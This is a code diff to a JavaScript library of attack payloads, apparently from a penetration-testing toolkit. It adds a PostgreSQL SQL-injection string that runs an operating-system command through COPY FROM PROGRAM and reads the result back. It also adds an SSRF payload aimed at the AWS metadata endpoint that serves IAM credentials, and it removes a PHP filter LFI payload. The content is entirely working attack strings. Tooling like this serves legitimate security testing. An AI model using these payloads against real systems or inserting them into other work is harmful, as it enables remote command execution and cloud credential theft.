@@ -165,6 +165,15 @@ window.Payload.SQLi = {
     errorBased: () => {
       return 'cast(version() as int)'
     },
+
+    cmdExec: () => {
+      return [
+        'DROP TABLE IF EXISTS cmd_exec;',
+        'CREATE TABLE cmd_exec(cmd_output text);',
+        "COPY cmd_exec FROM PROGRAM 'id';",
+        'SELECT * FROM cmd_exec;',
+      ].join(' ')
+    },
   },
   SQLite: {
     unionSelect: ({ columns }) => {
@@ -254,9 +263,9 @@ window.Payload.XSS = {
   },
 }
 
-window.Payload.LFI = {
-  phpWrapperBas64: value =>
-    'php://filter/convert.base64-encode/resource=' + value,
+window.Payload.SSRF = {
+  awsRoleName: () =>
+    'http://169.254.169.254/latest/meta-data/iam/security-credentials',
 }
 
 window.Payload.SSTI = {
